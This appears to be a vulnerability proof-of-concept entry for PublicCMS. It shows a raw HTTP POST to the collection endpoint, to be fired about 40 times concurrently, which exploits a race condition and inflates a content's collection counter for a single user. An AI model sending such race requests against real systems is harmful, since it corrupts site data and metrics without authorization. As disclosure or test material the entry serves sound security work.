### VULN-012 — redemption race (collect-once) -> counter stuffing
### Fire K in parallel from ONE logged-in user (repeat this request ~40x concurrently):
POST /collection/collect HTTP/1.1
Host: site2.dev.publiccms.com
Cookie: PUBLICCMS_USER=<racer-id>_<token>
Content-Type: application/x-www-form-urlencoded

_csrf=<token>&contentId=1

### -> each returns "true"; content.collections increments by >1 (e.g. +7) for a single user,
###    while cms_user_collection has exactly 1 marker row for that user.
